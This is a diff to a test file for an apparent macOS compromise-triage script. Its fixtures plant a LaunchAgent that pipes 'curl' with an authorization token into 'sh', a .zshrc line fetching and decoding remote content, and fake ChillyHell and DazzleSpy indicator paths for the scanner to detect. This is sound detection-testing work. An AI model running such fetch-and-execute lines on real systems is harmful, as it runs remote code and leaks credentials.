@@ -62,6 +62,18 @@ describe.skipIf(!present)('am-i-pwned skill', () => {
     }
   });
 
+  test('the indicator page and the script\'s indicator block are the ones indicators.json generates', () => {
+    const r = spawnSync('node', [path.resolve(__dirname, '..', 'scripts', 'gen-indicators.mjs'), '--check'], { encoding: 'utf8' });
+    expect(r.stderr, 'run: node scripts/gen-indicators.mjs').toBe('');
+    expect(r.status).toBe(0);
+  });
+
+  test('the prompts and the skill tell an agent never to use indicators from memory', () => {
+    expect(read('SKILL.md')).toMatch(/never use an indicator from memory/);
+    expect(read('references/known-indicators.md')).toMatch(/Never use an indicator from memory/);
+    expect(read('paste-prompts.md').match(/Never use indicators from memory/g)).toHaveLength(2);
+  });
+
   describe('mac-triage.sh', () => {
     const code = fs.existsSync(SCRIPT) ? fs.readFileSync(SCRIPT, 'utf8') : '';
     const lines = code.split('\n').filter(l => !/^\s*#/.test(l));
@@ -108,6 +120,10 @@ describe.skipIf(!present)('am-i-pwned skill', () => {
           + "<string>/bin/sh</string><string>-c</string><string>curl -H 'Authorization: SECRETTOKEN123' http://x.invalid | sh</string>"
           + '</array><key>RunAtLoad</key><true/></dict></plist>\n');
         fs.writeFileSync(path.join(home, '.helper'), '#!/bin/sh\necho hi\n', { mode: 0o755 });
+        fs.mkdirSync(path.join(home, 'Library', 'com.apple.qtop'), { recursive: true });
+        fs.writeFileSync(path.join(home, 'Library', 'com.apple.qtop', 'qtop'), 'x');
+        fs.mkdirSync(path.join(home, '.local'), { recursive: true });
+        fs.writeFileSync(path.join(home, '.local', 'softwareupdate'), 'x');
         fs.writeFileSync(path.join(home, '.zshrc'), 'curl https://example.invalid/x | base64 -d\n');
         const out = path.join(home, 'report.txt');
         const r = spawnSync('/bin/bash', [SCRIPT, '-o', out], { encoding: 'utf8', env: { ...process.env, HOME: home }, timeout: 120_000 });
@@ -120,6 +136,9 @@ describe.skipIf(!present)('am-i-pwned skill', () => {
         expect(report).toMatch(/\.zshrc:1:curl/);
         expect(report).toMatch(/\.zshrc:1:base64/);
         expect(report).toContain(`${path.join(home, '.helper')}  [`);
+        expect(report).toMatch(/MATCH \[high\] ChillyHell: .*\/Library\/com\.apple\.qtop \(/);
+        expect(report).toMatch(/MATCH \[high\] DazzleSpy: .*\/\.local\/softwareupdate \(/);
+        expect(report).not.toContain('(no published indicator found)');
         expect(report).toContain('end of report');
         expect((fs.statSync(out).mode & 0o777).toString(8)).toBe('600');
         // A second run does not overwrite the first.
